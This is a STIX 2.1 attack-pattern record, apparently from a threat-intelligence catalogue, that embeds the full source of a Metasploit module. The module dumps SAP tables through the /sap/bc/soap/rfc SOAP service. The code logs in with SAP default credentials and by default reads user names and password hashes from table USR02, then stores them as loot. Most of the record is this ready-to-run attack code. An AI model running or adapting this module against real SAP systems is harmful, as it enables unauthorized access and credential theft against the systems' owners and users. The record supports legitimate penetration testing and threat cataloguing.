{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2dae6a9-9653-44c4-8abb-776497fc9fe8",
    "created": "2024-08-14T16:27:01.277365Z",
    "modified": "2024-08-14T16:27:01.277369Z",
    "name": "SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data",
    "description": " This module makes use of the RFC_READ_TABLE Function to read data from tables using the /sap/bc/soap/rfc SOAP service.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_soap_rfc_read_table.rb",
            "external_id": "sap_soap_rfc_read_table.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy. I'd also like to thank Chris John Riley,\n# Ian de Villiers and Joris van de Vis who have Beta tested the modules and\n# provided excellent feedback. Some people just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data',\n      'Description' => %q{\n        This module makes use of the RFC_READ_TABLE Function to read data from tables using\n        the /sap/bc/soap/rfc SOAP service.\n      },\n      'References' =>\n        [\n          [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]\n        ],\n      'Author' =>\n        [\n          'Agnivesh Sathasivam',\n          'nmonkee'\n        ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('CLIENT', [true, 'SAP client', '001']),\n        OptString.new('HttpUsername', [true, 'Username', 'SAP*']),\n        OptString.new('HttpPassword', [true, 'Password', '06071992']),\n        OptString.new('TABLE', [true, 'Table to read', 'USR02']),\n        OptString.new('FIELDS', [true, 'Fields to read', 'BNAME,BCODE'])\n      ])\n  end\n\n  def run_host(ip)\n    columns = []\n    columns << '*' if datastore['FIELDS'].nil? or datastore['FIELDS'].empty?\n    if datastore['FIELDS']\n      columns.push(datastore['FIELDS']) if datastore['FIELDS'] =~ /^\\w?/\n      columns = datastore['FIELDS'].split(',') if datastore['FIELDS'] =~ /\\w*,\\w*/\n    end\n    fields = ''\n    columns.each do |d|\n      fields << \"<item><FIELDNAME>\" + d.gsub(/\\s+/, \"\") + \"</FIELDNAME></item>\"\n    end\n    exec(ip,fields)\n  end\n\n  def exec(ip,fields)\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">'\n    data << '<env:Body>'\n    data << '<n1:RFC_READ_TABLE xmlns:n1=\"urn:sap-com:document:sap:rfc:functions\" env:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">'\n    data << '<DELIMITER xsi:type=\"xsd:string\">|</DELIMITER>'\n    data << '<NO_DATA xsi:nil=\"true\"></NO_DATA>'\n    data << '<QUERY_TABLE xsi:type=\"xsd:string\">' + datastore['TABLE'] + '</QUERY_TABLE>'\n    data << '<DATA xsi:nil=\"true\"></DATA>'\n    data << '<FIELDS xsi:nil=\"true\">' + fields + '</FIELDS>'\n    data << '<OPTIONS xsi:nil=\"true\"></OPTIONS>'\n    data << '</n1:RFC_READ_TABLE>'\n    data << '</env:Body>'\n    data << '</env:Envelope>'\n    print_status(\"[SAP] #{ip}:#{rport} - sending SOAP RFC_READ_TABLE request\")\n    begin\n      res = send_request_cgi({\n        'uri' => '/sap/bc/soap/rfc',\n        'method' => 'POST',\n        'data' => data,\n        'cookie' => \"sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}\",\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n        'ctype' => 'text/xml; charset=UTF-8',\n        'encode_params' => false,\n        'headers' => {\n          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n        },\n        'vars_get' => {\n          'sap-client'    => datastore['CLIENT'],\n          'sap-language'  => 'EN'\n        }\n      })\n      if res and res.code != 500 and res.code != 200\n        # to do - implement error handlers for each status code, 404, 301, etc.\n        if res.body =~ /<h1>Logon failed<\\/h1>/\n          print_error(\"[SAP] #{ip}:#{rport} - login failed!\")\n        else\n          print_error(\"[SAP] #{ip}:#{rport} - something went wrong!\")\n        end\n        return\n      elsif res and res.body =~ /Exception/\n        response = res.body\n        error = response.scan(%r{<faultstring>(.*?)</faultstring>})\n        0.upto(error.length-1) do |i|\n          print_error(\"[SAP] #{ip}:#{rport} - error #{error[i]}\")\n        end\n        return\n      elsif res\n        response = res.body\n        output = response.scan(%r{<WA>([^<]+)</WA>}).flatten\n        print_status(\"[SAP] #{ip}:#{rport} - got response\")\n        saptbl = Msf::Ui::Console::Table.new(\n          Msf::Ui::Console::Table::Style::Default,\n          'Header' => \"[SAP] RFC_READ_TABLE\",\n          'Prefix' => \"\\n\",\n          'Postfix' => \"\\n\",\n          'Indent' => 1,\n          'Columns' => [\"Returned Data\"]\n        )\n        0.upto(output.length-1) do |i|\n          saptbl << [output[i]]\n        end\n        print(saptbl.to_s)\n        this_service = report_service(\n          :host  => ip,\n          :port => rport,\n          :name => 'sap',\n          :proto => 'tcp'\n        )\n        loot_path = store_loot(\"sap.tables.data\", \"text/plain\", ip, saptbl.to_s, \"#{ip}_sap_#{datastore['TABLE'].downcase}.txt\", \"SAP Data\", this_service)\n        print_good(\"[SAP] #{ip}:#{rport} - Data stored in #{loot_path}\")\n        return\n      else\n        print_error(\"[SAP] #{ip}:#{rport} - Unknown error\")\n        return\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"[SAP] #{ip}:#{rport} - Unable to connect\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}